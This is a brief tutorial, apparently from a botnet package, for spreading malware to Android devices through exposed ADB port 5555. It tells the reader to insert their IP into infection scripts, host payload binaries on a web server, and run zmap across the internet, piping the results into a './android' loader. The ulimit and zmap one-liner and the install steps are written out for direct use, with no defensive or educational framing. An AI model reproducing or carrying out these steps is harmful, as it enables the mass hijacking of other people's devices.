tutorial by influence 

edit src/main.c on line 211

now edit w.sh and c.sh with your ipv4 address and bins (of your bins server)
then put it to /var/www/html to your bins server

now go to your scanning server and execute these commands
yum install epel-release -y 
yum install zmap -y 
yum install gcc gcc-c++ -y 

sh build.sh

ulimit -n 999999;ulimit -u999999; zmap -p 5555 -o- -q -v0 -T3 | awk {'print $1":5555"'} | ./android

